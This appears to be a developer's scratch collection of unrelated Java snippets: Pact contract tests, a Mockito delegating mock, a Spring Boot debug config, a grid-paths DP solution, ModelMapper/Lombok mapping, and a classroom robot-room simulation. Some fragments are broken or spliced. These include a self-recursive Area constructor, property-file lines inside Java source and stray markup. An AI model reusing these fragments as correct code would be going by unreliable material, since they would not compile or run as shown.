    public PactFragment createFragment(ConsumerPactBuilder.PactDslWithProvider.PactDslWithState builder) {
        Map<String, String> headers = new HashMap<>();
        headers.put("Content-Type", "application/json;charset=UTF-8");

        return builder.uponReceiving("a request for Foos")
                .path("/foos")
                .method("GET")

                .willRespondWith()
                .headers(headers)
                .status(200)
                .body("[{\"value\":42}, {\"value\":100}]").toFragment();
    }

    @Test
    @PactVerification("Foo_State")
    public void runTest() {
        assertEquals(new ConsumerPort("http://localhost:8080").foos(), Arrays.asList(new Foo(42), new Foo(100)));
    }
}
==============================================================================================================
https://wilsonmar.github.io/pact/
https://reflectoring.io/pact-node-provider/
https://techblog.poppulo.com/sharing-consumer-driven-contracts-with-pact-broker/
==============================================================================================================
import au.com.dius.pact.provider.junit.loader.PactBroker;
import au.com.dius.pact.provider.junit.loader.PactFilter;
import au.com.dius.pact.provider.junit.loader.PactFolder;
import org.apache.http.HttpRequest;
import org.junit.Assert;
import org.junit.Test;

import java.lang.annotation.Annotation;
import java.util.Arrays;
import java.util.List;
import java.util.stream.Collectors;

public class InheritedAnnotationsTest {

    @Test
    public void shouldHaveInheritedAnnotations() {
        SampleProviderTest clazz = new SampleProviderTest();
        List<? extends Class<? extends Annotation>> list = Arrays.stream(clazz.getClass().getAnnotations())
                .map(Annotation::annotationType)
                .collect(Collectors.toList());

        Assert.assertTrue(list.containsAll(
                Arrays.asList(
                        PactBroker.class,
                        Provider.class,
                        Consumer.class,
                        PactFolder.class,
                        IgnoreNoPactsToVerify.class,
                        PactFilter.class)));
    }

    private class SampleProviderTest extends ParentClazz {
        @State("has no data")
        public void hasNoData() {
            System.out.println("Has no data state");
        }

        @TargetRequestFilter
        public void requestFilter(HttpRequest  httpRequest) {

        }
    }

    @PactBroker
    @Provider("testProvider")
    @Consumer("testConsumer")
    @PactFolder("pactFolder")
    @IgnoreNoPactsToVerify
    @PactFilter("myFilter")
    abstract class ParentClazz {

    }
}
==============================================================================================================
@Primary
@Bean(name = "demandeInscriptionRepositoryMock")
public DemandeInscriptionRepository demandeInscriptionRepositoryMock(final DemandeInscriptionRepository real) {
    MockSettings mockSetting = new MockSettingsImpl();

    Answer answer = invocation -> {
        if (invocation.getMethod().getName().equals("YOUR_METHOD")){
            return "YOUR_RETURN";
        }else{
            return AdditionalAnswers.delegatesTo(real).answer(invocation);
        }
    };

    mockSetting.defaultAnswer(answer);

    return Mockito.mock(DemandeInscriptionRepository.class, mockSetting);
}
==============================================================================================================
import au.com.dius.pact.core.matchers.Matchers;
import au.com.dius.pact.provider.junit.loader.PactFolder;
import au.com.dius.pact.provider.junit.target.HttpTarget;
import au.com.dius.pact.provider.junit.target.Target;
import au.com.dius.pact.provider.junit.target.TestTarget;
import com.github.restdriver.clientdriver.ClientDriverRule;
import org.apache.commons.io.IOUtils;
import org.junit.After;
import org.junit.Before;
import org.junit.ClassRule;
import org.junit.runner.RunWith;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.IOException;
import java.nio.charset.Charset;

import static com.github.restdriver.clientdriver.RestClientDriver.giveResponse;
import static com.github.restdriver.clientdriver.RestClientDriver.onRequestTo;

@RunWith(PactRunner.class)
@Provider("ArticlesProvider")
@PactFolder("src/test/resources/wildcards")
public class ArticlesContractTest {

  private static final Logger LOGGER = LoggerFactory.getLogger(ArticlesContractTest.class);

  @TestTarget
  public final Target target = new HttpTarget(8000);

  @ClassRule
  public static final ClientDriverRule embeddedService = new ClientDriverRule(8000);

  @Before
  public void before() throws IOException {
    System.setProperty(Matchers.PACT_MATCHING_WILDCARD, "true");
    String json = IOUtils.toString(getClass().getResourceAsStream("/articles.json"), Charset.defaultCharset());
    embeddedService.addExpectation(
      onRequestTo("/articles.json"), giveResponse(json, "application/json")
    );
  }

  @After
  public void after() {
    System.clearProperty(Matchers.PACT_MATCHING_WILDCARD);
  }

  @State("Pact for Issue 313")
  public void stateChange() {
    LOGGER.debug("stateChange - Pact for Issue 313 - Before");
  }

  @State(value = "Pact for Issue 313", action = StateChangeAction.TEARDOWN)
  public void stateChangeAfter() {
    LOGGER.debug("stateChange - Pact for Issue 313 - After");
  }
}
==============================================================================================================
<plugin>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-maven-plugin</artifactId>
            <configuration>
				<fork>true</fork>
				<arguments>
					<argument>-Dfile.encoding=UTF8</argument>
				</arguments>
				<jvmArguments>-Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8002
					-Dfile.encoding=UTF8</jvmArguments>
			</configuration>
</plugin>
==============================================================================================================
Problem: A robot is located at the top-left corner of a m x n grid.
The robot can only move either down or right at any point in time. The robot is trying to reach the bottom-right corner of the grid .
How many possible unique paths are there?

Approach 1(Recursion):

Let NumberOfPaths(m, n) be the count of paths to reach row number m and column number n in the matrix, NumberOfPaths(m, n) can be recursively written as following.

view sourceprint?
/ Returns count of possible paths to reach cell at row number m and column
// number n from the topmost leftmost cell (cell at 1, 1)
int  numberOfPaths(int m, int n)
{
   // If either given row number is first or given column number is first
   if (m == 1 || n == 1)
        return 1;
  
   // If diagonal movements are allowed then the last addition
   // is required.
   return  numberOfPaths(m-1, n) + numberOfPaths(m, n-1);
           // + numberOfPaths(m-1,n-1);
}
The time complexity of above recursive solution is exponential.

Approach 2(Dynamic Programming):

This problem has both properties of a dynamic programming problem. Like other typical Dynamic Programming(DP) problems, recomputations of same subproblems can be avoided by constructing a temporary array count[][] in bottom up manner using the above recursive formula.

int numberOfPaths(int m, int n)
{
    // Create a 2D table to store results of subproblems
    int count[m][n];
  
    // Count of paths to reach any cell in first column is 1
    for (int i = 0; i < m; i++)
        count[i][0] = 1;
  
    // Count of paths to reach any cell in first column is 1
    for (int j = 0; j < n; j++)
        count[0][j] = 1;
 <strong>
    // Calculate count of paths for other cells in bottom-up manner using
    // the recursive solution
    for (int i = 1; i < m; i++)
    {
        for (int j = 1; j < n; j++)
  
            // By uncommenting the last part of the code calculates the total
            // possible paths if the diagonal Movements are allowed
            count[i][j] = count[i-1][j] + count[i][j-1]; //+ count[i-1][j-1];
  
    }
    return count[m-1][n-1];
}

==============================================================================================================
public class MyService {
     private ModelMapper modelMapper;

     public MyService(){
         this.modelMapper = new ModelMapper();
         this.modelMapper.getConfiguration()
            .setMatchingStrategy(MatchingStrategies.STRICT)
            .setDestinationNamingConvention(LombokBuilderNamingConvention.INSTANCE)
            .setDestinationNameTransformer(LombokBuilderNameTransformer.INSTANCE);
     }

     public OutputDTO aMethod(final InputDTO input){
          return modelMapper.map(input, OutputDTO.OutputDTOBuilder.class).build(); 
     }
}
Where LombokBuilderNamingConvention is:

import org.modelmapper.spi.NamingConvention;
import org.modelmapper.spi.PropertyType;

public class LombokBuilderNamingConvention implements NamingConvention {

    public static LombokBuilderNamingConvention INSTANCE = new LombokBuilderNamingConvention();

    @Override
    public boolean applies(String propertyName, PropertyType propertyType) {
        return PropertyType.METHOD.equals(propertyType);
    }

    @Override
    public String toString() {
        return "Lombok @Builder Naming Convention";
    }

}
And LombokBuilderNameTransformer is:

import org.modelmapper.spi.NameTransformer;
import org.modelmapper.spi.NameableType;


public class LombokBuilderNameTransformer implements NameTransformer {

    public static final NameTransformer INSTANCE = new LombokBuilderNameTransformer();

    @Override
    public String transform(final String name, final NameableType nameableType) {
        return Strings.decapitalize(name);
    }

    @Override
    public String toString() {
        return "Lombok @Builder Mutator";
    }
}
And OutputDTO can look like:

@Builder // Has .builder() static method
@Value // Thus immutable
public class OutputDTO {
   private String foo;
   private int bar;
} 
==============================================================================================================
public class Robot {
    private static final int NORTH = 0, EAST = 1, SOUTH = 2, WEST = 3;
    private int direction;
    private int x, y;

    private Grid grid;

    public Robot(Grid grid) {
        this.x = 0;
        this.y = 0;

        this.grid = grid;
        direction = NORTH;
    }

    public void right() {
        direction++;
        if (direction == 4) {
            direction = 0;
        }
    }

    public void left() {
        direction--;
        if (direction == -1) {
            direction = 3;
        }
    }

    public void forward() {
        if (direction == NORTH) {
            y--;
        } else if (direction == SOUTH) {
            y++;
        } else if (direction == EAST) {
            x++;
        } else if (direction == WEST) {
            x--;
        }
    }

    public void put() {
        grid.put(x, y);
    }

    public void pick() {
        grid.pick(x, y);
    }
}

	
	
	
	
private int numberOfObjects;
private Robot robot;
private static final int X = 10;
private static final int Y = 10;
private Object [][] area; // grid

public Area(){ // defines a grid and robot
    area = new Area[X][Y];
    for(int a=0;a<X;a++){
        for(int b=0;b<Y;b++)
            area[a][b]=".";
    }

    numberOfObjects = 0; // grid is initially empty
    Area ar = new Area();
    robot = new Robot(ar);
}

public void Put(int x,int y){ // put the object to position (x,y)
    area[x][y]=numberOfObjects++;
}

public void PickUp(int x,int y){ // pick up the object in position (x,y)
    if(area[x][y]!=null){
        area[x][y]=numberOfObjects--;
    }
}

public void PrintAGrid(){
    for(int r=0;r<X;r++){
        for(int c=0;c<Y;c++)
        System.out.print(area[r][c]+" ");
     System.out.println();
    }
    System.out.println();
}
}



edit
play_arrow

brightness_4
// Java implementation of the approach 
class GFG { 
  
    // Function that returns true if the robot is safe 
    static boolean isSafe(int N, int M, char[] str) 
    { 
  
        int coll = 0, colr = 0, rowu = 0, rowd = 0; 
  
        for (int i = 0; i < str.length; i++) { 
  
            // If current move is "L" then 
            // increase the counter of coll 
            if (str[i] == 'L') { 
                coll++; 
                if (colr > 0) { 
                    colr--; 
                } 
  
                // If value of coll is equal to 
                // column then break 
                if (coll == M) { 
                    break; 
                } 
            } 
  
            // If current move is "R" then 
            // increase the counter of colr 
            else if (str[i] == 'R') { 
                colr++; 
                if (coll > 0) { 
                    coll--; 
                } 
  
                // If value of colr is equal to 
                // column then break 
                if (colr == M) { 
                    break; 
                } 
            } 
  
            // If current move is "U" then 
            // increase the counter of rowu 
            else if (str[i] == 'U') { 
                rowu++; 
                if (rowd > 0) { 
                    rowd--; 
                } 
  
                // If value of rowu is equal to 
                // row then break 
                if (rowu == N) { 
                    break; 
                } 
            } 
  
            // If current move is "D" then 
            // increase the counter of rowd 
            else if (str[i] == 'D') { 
                rowd++; 
                if (rowu > 0) { 
                    rowu--; 
                } 
  
                // If value of rowd is equal to 
                // row then break 
                if (rowd == N) { 
                    break; 
                } 
            } 
        } 
  
        // If robot is within the bounds of the grid 
        if (Math.abs(rowd) < N && Math.abs(rowu) < N 
            && Math.abs(coll) < M && Math.abs(colr) < M) { 
            return true; 
        } 
  
        // Unsafe 
        return false; 
    } 
  
    // Driver code 
    public static void main(String[] args) 
    { 
        int N = 1, M = 1; 
        String str = "R"; 
  
        if (isSafe(N, M, str.toCharArray())) 
            System.out.println("Yes"); 
        else
            System.out.println("No"); 
    } 
} 
  
// This code is contributed by 29AjayKumar 








package geneseo.cs.sc;




import java.awt.Graphics;
import java.awt.Color;
import java.awt.Point;




property.mockbot.config.grid.height.positive=
property.mockbot.config.grid.width.positive=
property.mockbot.config.grid.notNull=


/**
 * Represents simple simulated robots. These robots occupy rooms with walls and
 * tiled floors. Robots walk around on the floors (one tile at a time), changing
 * and sensing the colors of tiles if they wish. But robots can't move through
 * walls, thus they have to stay in their room. Robots can face in any of four
 * directions, which are described as compass directions in analogy to a map:
 * north is towards the top of the robot's room as drawn on a computer screen,
 * east is towards the right, etc.
 * @see geneseo.cs.sc.RobotRoom
 */

public class Robot {




    /**
     * The heading a robot has when facing north.
     */

    public static final int NORTH = 0;


    /**
     * The heading a robot has when facing east.
     */
    
    public static final int EAST = 1;


    /**
     * The heading a robot has when facing south.
     */
    
    public static final int SOUTH = 2;


    /**
     * The heading a robot has when facing west.
     */
    
    public static final int WEST = 3;




    // Internally, a robot records the room it is in, its row and column
    // coordinates (in tiles) within that room, its heading, whether
    // or not it is visible, and the amount of time it should delay
    // after movements:

    private RobotRoom room;
    private int row;
    private int col;
    private int direction;
    private boolean visible;
    private int delayTime;

    private static final int initialDelay = 500;	// Number of milliseconds delay for new robots

    


    // Robots also have some data that they use to draw themselves: x and y offsets
    // of vertices of the robot relative to its center, and a color to draw it in
    // (see the comments for the "draw" method below for more details):
    
    private static final int[] xOffsets = { 0, -10, -5, -5, 5, 5, 10 };
    private static final int[] yOffsets = { -10, 0, 0, 10, 10, 0, 0 };

    private static final Color robotColor = new Color( (float)0.25, (float)0.0, (float)0.3 );
    



    /**
     * Initialize a robot and a room for it to occupy. The room will be a default room,
     * and this robot will be its only occupant. The robot will have the default position
     * and heading (center of the room, facing north). For example
	 * <p><code>Robot r = new Robot();</code></p>
     */

    public Robot() {

        room = new RobotRoom();				// A default room for this robot.

        col = room.getRoomWidth() / 2;
        row = room.getRoomHeight() / 2;

        direction = NORTH;

        visible = true;
        delayTime = initialDelay;

        room.addRobot( this, col, row );
    }




    /**
     * Initialize a robot from its position, orientation, and room. For example
	 * <p><code>Robot r = new Robot( 1, 3, Robot.NORTH, someRoom );</code></p>
     * @param col The horizontal coordinate of the tile this robot is on (i.e., the
     *  tile column the robot is in). This must be within the range of columns
     *  for the room the robot is in, and, with the row parameter, must specify
     *  an unobstructed tile.
     * @param row The vertical coordinate of the tile this robot is on (i.e., the
     *  tile row the robot is in). This must be within the range of rows for
     *  the room the robot is in, and, with the column parameter, must specify
     *  an unobstructed tile.
     * @param heading The robot's heading. This should be one of the four headings
     *  defined for robots.
     * @param room The room the robot is in.
     */

    public Robot( int col, int row, int heading, RobotRoom room ) {

        this.room = room;
        this.col = col;
        this.row = row;
        this.direction = heading;
        this.visible = true;
        this.delayTime = initialDelay;

        room.addRobot( this, col, row );
    }




    /**
     * Move a robot one tile forward, unless the way is blocked by a wall or
     *  other robot. If the way is blocked, the robot will flash briefly to
     *  indicate that it can't move. For example
	 *  <p><code>r.move();</code></p>
     */
    
    public void move() {

        if ( this.okToMove() ) {
            
            Point next = this.nextTile();
            room.moveRobot( col, row, next.x, next.y );
            col = next.x;
            row = next.y;
            
            this.delay();
        }
        else {
            this.flash(); 
        }
    }




    /**
     * Find out whether a robot can move forward. A robot can move whenever
     *  the tile in front of it doesn't contain a wall or another robot.
	 *  For example
	 *  <p><code>if ( r.okToMove() ) {...</code></p>
     * @return True if the robot can move, false if moving would cause the
     *  robot to collide with a wall or another robot.
     */

    public boolean okToMove() {
        Point next = this.nextTile();
        return ! room.isObstructed( next.x, next.y );
    }




    /**
     * Turn a robot 90 degrees to its left (i.e., counterclockwise about
     *  its center). For example
	 *  <p><code>r.turnLeft();</code></p>
     */

    // I do a 90-degree left turn as 3 90-degree right turns, 'though done
    // all at once so the user doesn't see distinct turns.

    public void turnLeft() {
        this.turn( 3 );
    }




    /**
     * Turn a robot 90 degrees to its right (i.e., clockwise about its center).
	 *  For example
	 *  <p><code>r.turnRight();</code></p>
     */
    
    public void turnRight() {
        this.turn( 1 );
    }




    /**
     * Change the color of the tile under a robot. For example
	 *  <p><code>r.paint( java.awt.Color.yellow );</code></p>
     * @param newColor The color the tile changes to.
     */

    public void paint( Color newColor ) {
        room.setColor( col, row, newColor );
    }




    /**
     * Find out what color the tile under a robot is. For example
	 *  <p><code>if ( r.colorOfTile() == java.awt.Color.red ) {...</code></p>
     * @return The color of the tile under the robot.
     */

    public Color colorOfTile() {
        return room.getColor( col, row );
    }




    /**
     * Find out what direction a robot is facing. For example
	 *  <p><code>if ( r.heading() == Robot.NORTH ) {...</code></p>
     * @return The robot's direction, encoded as one of the values
     *  <code>Robot.NORTH</code>, <code>Robot.EAST</code>,
     *  <code>Robot.SOUTH</code>, or <code>Robot.WEST</code>.
     */

    public int heading() {
        return direction;
    }




    /**
     * Set the speed at which a robot moves and turns. For example
	 *  <p><code>r.setSpeed( 100 );</code></p>
     * @param speed An integer between 1 and 1000, which indicates approximately
     *  how many moves or turns per second the robot should do. Values below 1
     *  or above 1000 are treated as if they were 1 and 1000, respectively.
     */

    public void setSpeed( int speed ) {

        if ( speed < 1 ) {
            speed = 1;
        }

        if ( speed > 1000 ) {
            speed = 1000;
        }

        delayTime = 1000 / speed;
    }




    /**
     * Draw a robot.
     * @param context The graphics context in which to draw.
     * @param x The horizontal coordinate at which to place the robot's center.
     * @param y The vertical coordinate at which to place the robot's center
     */

    // The robot is a polygon, filled with a robot color not likely to be
    // generated by a student -- right now, a dark purple. I define the polygon
    // by giving lists of X and Y offsets for its vertices from the center of
    // the robot, when the robot is facing north. For other orientations, I
    // rotate these offsets using the standard equations for 2D rotation
    // (x' = x cos(a) + y sin(a); y' = -x sin(a) + y cos(a)), keeping in mind
    // that the rotations are all multiples of 90 degrees, so the sines and cosines
    // are all -1, 1, or 0. To actually draw the robot, I add the rotated offsets
    // to the center coordinates provided as parameters, and use the results as
    // the vertices of a filled polygon.

    protected void draw( Graphics context, int x, int y ) {

        if ( visible ) {

            int sine;				// Will hold the sine of the rotation angle
            int cosine;				// Will hold the cosine of the rotation angle

            switch ( direction ) {
                case NORTH:				// no rotation
                    sine = 0;
                    cosine = 1;
                    break;
                case WEST:				// 90 degrees
                    sine = 1;
                    cosine = 0;
                    break;
                case SOUTH:				// 180 degrees
                    sine = 0;
                    cosine = -1;
                    break;
                case EAST:				// -90 degrees
                    sine = -1;
                    cosine = 0;
                    break;
                default:				// Invalid rotations act like no rotation
                    sine = 0;
                    cosine = 1;
                    break;
            }

            int[] xVertices = new int[ xOffsets.length ];
            int[] yVertices = new int[ yOffsets.length ];

            for ( int i = 0; i < xOffsets.length; i++ ) {
                xVertices[i] = x + cosine * xOffsets[i] + sine * yOffsets[i];
                yVertices[i] = y - sine * xOffsets[i] + cosine * yOffsets[i];
            }

            context.setColor( robotColor );
            context.fillPolygon( xVertices, yVertices, xVertices.length );            
        }
    }




    /**
     * Find out the tile coordinates of the tile a robot would move to if it moved
     *  forward (assuming that move is permitted).
     * @return A Point containing the tile column (x coordinate) and row (y
     *  coordinate) of the tile the robot would move to.
     */

    private Point nextTile() {
        
        switch ( direction ) {

            case NORTH:
                return new Point( col, row - 1 );

            case EAST:
                return new Point( col + 1, row );

            case SOUTH:
                return new Point( col, row + 1 );

            case WEST:
                return new Point( col - 1, row );

            default:					// Treat invalid headings as if they were north
                return new Point( col, row - 1 );
        }
    }




    /**
     * Pause. This is useful in order to slow down robot programs enough that users
     *  can see where their robot is moving, for visual debugging.
     */

    private void delay() {

        try {
            Thread.sleep( delayTime );
        }
        catch ( InterruptedException interrupt ) { }
    }




    /**
     * Make a robot flash on the screen. Typically used to signal some error, e.g.,
     *  running into a wall or other robot.
     */

    // This works by toggling a "visible" flag in the robot, while redrawing its
    // room. A pause between redraws ensures that the user's brain has time to
    // process the alternately visible and invisible robots as "flashing".

    private void flash() {

        final int flashes = 6;				// The number of times to toggle the robot
        final int flashDelay = 80;			// Milliseconds to wait between toggles

        for ( int i = 0; i < flashes; i++ ) {
            
            visible = ! visible;
            room.repaint();

            try {
                Thread.sleep( flashDelay );    
            }
            catch ( InterruptedException interrupt ) { }
        }
    }




    /**
     * Turn a robot an arbitrary number of 90-degree steps clockwise.
     * @param steps The number of 90-degree steps to turn.
     */

    // Since directions are represented by integers in the range 0 to 3,
    // increasing clockwise from north, I turn by simply adding the number
    // of steps to the current direction, and taking the result mod 4 to keep
    // it a valid direction.

    private void turn( int steps ) {
        
        direction = ( direction + steps ) % 4;

        room.repaint();

        this.delay();        
    }
    
}






// This class represents rooms in which robots can move about.
//
// History:
//
//   July 2003 -- Created by Doug Baldwin.
//
//   March 2004 -- Extended by Doug Baldwin to accept "K" (black) as a
//     color specification for tiles in room descriptions.




package geneseo.cs.sc;

import java.util.StringTokenizer;
import javax.swing.JFrame;
import java.awt.*;




/**
 * Represents a room in which Science of Computing robots can move. A room consists
 * of a tiled floor and walls. The floor tiles can be colored. Within the room,
 * tiles provide a coordinate system for describing the positions of robots, walls,
 * etc. The coordinate system's origin is the upper left corner of the room, with
 * horizontal coordinates increasing to the right and vertical coordinates increasing
 * down. Coordinates start at 0, i.e., the left-most side of the room is horizontal
 * coordinate 0, and the top side is row 0. Every room has walls around its edges
 * (so that robots can't fall out of the room), and a room may have other walls
 * (or fragments of wall) in its interior.
 * @see geneseo.cs.sc.Robot
 */

public class RobotRoom extends Canvas {




    // Robot rooms use an internal class to represent tiles. This class
    // is basically just a simple record that stores a tile's color, whether
    // it has a wall on it, and whether it has a robot on it (and which robot,
    // if so). It also provides some simple support for things like initializing
    // and drawing tiles.

    private static class Tile {

        public static final int WIDTH = 30;		// The width of a tile when drawn, in pixels
        public static final int HEIGHT = 30;		// A tile's height, in pixels
        public static final Color wallColor = new Color( (float)0.4, (float)0.32, (float)0.08 );
        
        public Color color;				// The tile's color
        public Robot occupant;				// The robot on this tile, or null
        public boolean isWall;				// True if there is a wall on this tile

        public Tile( Color color, Robot occupant, boolean isWall ) {
            if ( isWall ) {
                this.color = wallColor;
            }
            else {
                this.color = color;
            }
            this.occupant = occupant;
            this.isWall = isWall;
        }

        public void draw( Graphics context, int left, int top ) {
            context.setColor( color );
            context.fillRect( left, top, WIDTH, HEIGHT );
            if ( occupant != null ) {
                occupant.draw( context, left+WIDTH/2, top+HEIGHT/2 );
            }
        }

    }
    



    // Internally, robot rooms record their width and height, and an array
    // of their tiles. They also have a frame in which they appear on the
	// screen:

    private int width;
    private int height;
    private Tile[][] tiles;
	private JFrame window;




    // Internal parameters for drawing robot rooms:
    
    private final int inset = 20;			// Number of pixels room is inset from frame's sides



    
    /**
     * Initialize a robot's room with default size and contents. The default
     * is a square room 10 tiles on a side, with all tiles white and no
     * interior walls. For example
	 *  <p><code>RobotRoom room = new RobotRoom();</code></p>
     */

    public RobotRoom() {
        this( "11 11" );
    }




    /**
     * Initialize a robot's room from its description. Regardless of what
     *  the description calls for, the room will be at least three tiles by
     *  three tiles, to leave space for a wall all around the room and at least
     *  one tile for a robot inside. The room will be no more than 25 tiles
     *  by 25. For example
	 *  <p><code>RobotRoom room = new RobotRoom( "5 5 2 1 Y" );</code></p>
     * @param description The description of the room. This is a string that
     *  must start with two integers, the room's width and height, in tiles.
     *  The string may then contain any number of tile specifications, which
     *  consist of column and row coordinates (integers) followed by a color
     *  or wall designator (R, G, B, Y, or K for red, green, blue, yellow, and
     *  black, or * for a wall). All elements of the specification should be
     *  separated by white space. For example
     *    <code>9 5 4 2 * 3 2 r</code>
     *  specifies a 9-tile wide by 5-tile high room whose middle tile is
     *  a wall, the tile to its left is red. The outer-most rows and columns of
     *  the room always contain walls, and any tiles not defined by the description
     *  are white.
     */

    public RobotRoom( String description ) {
    
    	super();
    	

        // Initialize the frame in which this world will appear:

        window = new JFrame( "Robot Room" );
		
		window.getContentPane().add( this );

        window.setDefaultCloseOperation( JFrame.EXIT_ON_CLOSE );
        
        
        // Get the requested width and height:

        final int minWidth = 3;
        final int maxWidth = 25;
        final int minHeight = 3;
        final int maxHeight = 25;
        
        width = minWidth;		// Width and height start with their
        height = minHeight;		// default values

        StringTokenizer tokens = new StringTokenizer( description );

        try {

            width = Integer.parseInt( tokens.nextToken() );
            if (  width < minWidth  ||  width > maxWidth  ) {
                width = minWidth;
            }

            height = Integer.parseInt( tokens.nextToken() );
            if (  height < minHeight  ||  height > maxHeight  ) {
                height = minHeight;
            }
        }
        catch ( Exception error ) {
            // Ignore exceptions in processing width and height, width and/or
            // height variables will come out with their default values when
            // there are errors.
        }


        // Create the tile array, filling it with empty white tiles everywhere except
        // the outer rows and columns, which have walls on them:

        tiles = new Tile[height][width];

        for ( int row = 0; row < height; row++ ) {
            for ( int col = 0; col < width; col++ ) {
                boolean isWall = ( row == 0 || row == height-1 || col == 0 || col == width-1 );
                tiles[row][col] = new Tile( Color.white, null, isWall );
            }
        }


        // Go through the rest of the room's description, changing any tiles that it mentions
        // to the color and wall status it requests. But don't allow changes in the border wall,
        // or outside the room:

        while ( tokens.hasMoreTokens() ) {

            try {
                
                int col = Integer.parseInt( tokens.nextToken() );
                int row = Integer.parseInt( tokens.nextToken() );
                char colorCode = tokens.nextToken().charAt(0);

                if (  row > 0  &&  row < height-1  &&  col > 0  &&  col < width-1  ) {
                    switch ( colorCode ) {
                        case 'r':
                        case 'R':
                            tiles[row][col].color = Color.red;
                            tiles[row][col].isWall = false;
                            break;
                        case 'g':
                        case 'G':
                            tiles[row][col].color = Color.green;
                            tiles[row][col].isWall = false;
                            break;
                        case 'b':
                        case 'B':
                            tiles[row][col].color = Color.blue;
                            tiles[row][col].isWall = false;
                            break;
                        case 'y':
                        case 'Y':
                            tiles[row][col].color = Color.yellow;
                            tiles[row][col].isWall = false;
                            break;
                        case 'k':
                        case 'K':
                            tiles[row][col].color = Color.black;
                            tiles[row][col].isWall = false;
                            break;
                        case '*':
                            tiles[row][col].isWall = true;
                            tiles[row][col].color = Tile.wallColor;
                            break;
                    }
                }
            }
            catch ( Exception error ) {
                // Do nothing on an error, try to continue with the next tile, if any.
            }
        }


        // Size the window to display the room, and make it visible to the user. Note that
        // the window width and height reflect the space needed for the window's border, an
        // inset between each side of the room and the window border, and space for the room's
        // tiles, each of which has a 1-pixel border between it and the previous tile, plus
        // a one-pixel border after the last tile:

        window.pack();
        
        Insets borders = window.getInsets();
        int windowWidth = borders.left + borders.right + 2 * inset + width * ( Tile.WIDTH + 1 ) + 1;
        int windowHeight = borders.top + borders.bottom + 2 * inset + height * (Tile.HEIGHT + 1 ) + 1;
        window.setSize( windowWidth, windowHeight );

		this.setVisible( true );
        window.setVisible( true );
    }




    /**
     * Put a robot in a room. This will put the robot at the requested
     *  position if possible. If not possible, because the requested
     *  position is outside the room, because there is a wall at the
     *  requested position, or because another robot is already at the
     *  requested position, then the new robot is not placed in the room
     *  at all. For example
	 *  <p><code>room.addRobot( someRobot, 3, 5 );</code></p>
     * @param robot The robot that is being put in this room.
     * @param col The horizontal coordinate (tile column) at which to
     *  place this robot.
     * @param row The vertical coordinate (tile row) at which to place
     *  this robot.
     */

    public void addRobot( Robot robot, int col, int row ) {
        
        if (  col >= 0  &&  col < width  &&  row >= 0  &&  row < height ) {
            if (  ! tiles[row][col].isWall  &&  tiles[row][col].occupant == null  ) {
                tiles[row][col].occupant = robot;
            }
        }

        this.repaint();
    }




    /**
     * Get a room's width. For example
	 *  <p><code>int w = room.getRoomWidth();</code></p>
     * @return The width of the room, in tiles.
     */

    public int getRoomWidth() {
        return width;
    }




    /**
     * Get a room's height. For example
	 *  <p><code>int h = room.getRoomHeight();</code></p>
     * @return The room's height, in tiles.
     */

    public int getRoomHeight() {
        return height;
    }




    /**
     * Move a robot from one tile to another.
     * @param oldCol The horizontal coordinate (tile column) of the tile the
     *  robot is moving from.
     * @param oldRow The vertical coordinate (tile row) of the tile the robot
     *  is moving from.
     * @param newCol The horizontal coordinate of the tile the robot is moving to.
     * @param newRow The vertical coordinate of the tile the robot is moving to.
     */

    protected void moveRobot( int oldCol, int oldRow, int newCol, int newRow ) {
        
        tiles[newRow][newCol].occupant = tiles[oldRow][oldCol].occupant;
        tiles[oldRow][oldCol].occupant = null;
        
        this.repaint();
    }




    /**
     * Find out whether a tile within a room is obstructed. A tile is obstructed
     *  if it contains a wall or robot.
     * @param col The horizontal coordinate (tile column) of the tile.
     * @param row The vertical coordinate (tile row) of the tile.
     * @return True if the specified tile is obstructed, false if it is not.
     */

    protected boolean isObstructed( int col, int row ) {
        return (  tiles[row][col].isWall  ||  tiles[row][col].occupant != null  );
    }
    



    /**
     * Change the color of a tile in a room.
     * @param col The horizontal coordinate (i.e., tile column) of the tile
     *  to change.
     * @param row The vertical coordinate (i.e., tile row) of the tile
     *  to change.
     * @param newColor The color to make the tile.
     */

    protected void setColor( int col, int row, Color newColor ) {

        if (  col >= 0  &&  col < width  &&  row >= 0  &&  row < height  ) {
            tiles[row][col].color = newColor;
            this.repaint();            
        }
    }




    /**
     * Find out what color a tile within a room has.
     * @param col The horizontal coordinate (i.e., tile column) of the tile.
     * @param row The vertical coordinate (i.e.,tile row) of the tile.
     * @return The color of the tile at the specified column and row. If the row
     *  or column are out of bounds for this room, then the color is assumed to
     *  be white.
     */

    protected Color getColor( int col, int row ) {

        if (  col >= 0  &&  col < width  &&  row >= 0  &&  row < height  ) {
            return tiles[row][col].color;            
        }
        else {
            return Color.white;
        }
    }




    /**
     * Redisplay a robot room. This method should never be called by client
     *  code, it is called automatically by the Java runtime system when the
     *  runtime system believes that a robot room needs to be redrawn.
     * @param context The graphics context in which to draw the room.
     */

    public void paint( Graphics context ) {


        // Draw the borders between tiles as a series of horizontal and vertical
        // lines. Note that line and tile positions take into account both the
        // size of a tile and the one-pixel lines in between them:

        int leftEdge = inset;										// The coordinate of the left edge of the room
        int rightEdge = leftEdge + width * ( Tile.WIDTH + 1 );		// The coordinate of right edge of room
        int topEdge = inset;										// The coordinate of the top edge of the room
        int bottomEdge = topEdge + height * ( Tile.HEIGHT + 1 );	// Coordinate of bottom edge of the room

        context.setColor( Color.black );

        for ( int row = 0; row < height; row++ ) {
            int vPos = topEdge + row * ( Tile.HEIGHT + 1 );
            context.drawLine( leftEdge, vPos, rightEdge, vPos );
        }

        context.drawLine( leftEdge, bottomEdge, rightEdge, bottomEdge );

        for ( int col = 0; col < width; col++ ) {
            int hPos = leftEdge + col * ( Tile.WIDTH + 1);
            context.drawLine( hPos, topEdge, hPos, bottomEdge );
        }

        context.drawLine( rightEdge, topEdge, rightEdge, bottomEdge );


        // Draw the tiles themselves:

        for ( int row = 0; row < height; row++ ) {
            for ( int col = 0; col < width; col++ ) {
                tiles[row][col].draw( context,
                                      leftEdge + 1 + col*(Tile.WIDTH+1),
                                      topEdge + 1 + row*(Tile.HEIGHT+1) );
            }
        }
    }   
}
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
